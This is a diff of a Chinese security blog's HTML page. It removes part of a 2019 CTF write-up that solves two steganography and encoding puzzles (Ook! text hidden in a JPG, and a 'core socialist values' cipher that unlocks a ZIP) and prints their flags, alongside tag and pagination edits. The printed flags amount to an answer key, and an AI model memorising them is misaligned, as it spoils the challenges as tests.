-<p>解压下来<code>timg.jpg</code>，在文件末尾发现<code>Ook!编码</code></p>
-<p>Ps：解压时发现Winrar会文件头报错，但是7-zip可以直接忽略</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/3-2.png" alt="3-2"></p>
-<p>直接到在线网站去解密：<a href="http://tool.bugku.com/brainfuck/?wafcloud=2&amp;tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">http://tool.bugku.com/brainfuck/?wafcloud=2&amp;tdsourcetag=s_pcqq_aiomsg</a></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/3-3.png" alt="3-3"></p>
-<p><code>flag{f71d6bca-3210-4a31-9feb-1768a65a33db}</code></p>
-<h2 id="4-24word"><a href="#4-24word" class="headerlink" title="4. 24word"></a>4. 24word</h2><p>下载下来一个<code>ZIP压缩文件</code>，解压出来<code>24w.png</code>。<code>foremost</code>跑出来一个zip压缩文件和一个png图片</p>
-<p>ZIP文件解压需要密码；PNG图片里面是社会主义核心价值观</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/4-1.png" alt="4-1"></p>
-<p>这个是<code>社会主义核心价值观编码</code>，到在线网站：<a href="https://z.duoluosb.com/" target="_blank" rel="noopener">https://z.duoluosb.com/</a></p>
-<p>密文：<code>自由和谐公正诚信平等公正自由公正平等平等公正公正民主公正诚信文明法治平等公正平等法治和谐</code></p>
-<p>解出：<code>CodeValues</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/4-2.png" alt="4-2"></p>
-<p>用解出的拿去作为ZIP密码，解压得到<code>24c.jpg</code>，打开图片发现藏着一个二维码，微信扫一下直接得到flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/4-3.png" alt="4-3"></p>
-<p><code>flag{24_word_m4n7ra}</code></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">CTF比赛</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/08/15/CTF比赛—2019网络与信息安全领域专项赛WriteUp/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/Knlvre.github-io/">&laquo; Prev</a><a class="page-number" href="/Knlvre.github-io/">1</a><span class="page-number current">2</span><a class="page-number" href="/Knlvre.github-io/page/3/">3</a><a class="page-number" href="/Knlvre.github-io/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/Knlvre.github-io/page/6/">6</a><a class="extend next" rel="next" href="/Knlvre.github-io/page/3/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/Knlvre.github-io/">&laquo; Prev</a><a class="page-number" href="/Knlvre.github-io/">1</a><span class="page-number current">2</span><a class="page-number" href="/Knlvre.github-io/page/3/">3</a><a class="page-number" href="/Knlvre.github-io/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/Knlvre.github-io/page/7/">7</a><a class="extend next" rel="next" href="/Knlvre.github-io/page/3/">Next &raquo;</a>
     </nav>
   
 
@@ -2297,10 +2248,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
               </li>
              
@@ -2309,11 +2256,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Sqli-labs</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">基础知识点</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Sqli-labs</a>
               </li>
              
               <li class="article-tag-list-item">
